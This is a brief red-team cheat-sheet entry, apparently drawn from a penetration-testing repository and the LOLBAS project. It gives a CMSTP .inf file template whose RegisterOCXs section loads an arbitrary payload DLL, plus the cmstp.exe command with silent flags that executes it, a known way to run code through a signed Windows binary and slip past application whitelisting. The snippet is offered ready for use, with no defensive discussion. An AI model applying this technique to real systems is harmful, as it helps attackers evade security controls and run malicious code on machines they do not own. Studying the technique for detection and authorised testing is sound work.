### Source
* https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/red-teaming/cmstp-template.inf
* https://lolbas-project.github.io/lolbas/Binaries/Cmstp/

### File template
```
[version]
signature=$chicago$
 
[defaultinstall_singleuser]
registerocxs=r
 
[r]
C:\fully\qualified\path\to\payload.dll
 
[strings]
servicename=foobar
shortsvcname=foobar
```

### Execute file
```
cmstp.exe /ni /s .\<file>.inf
```

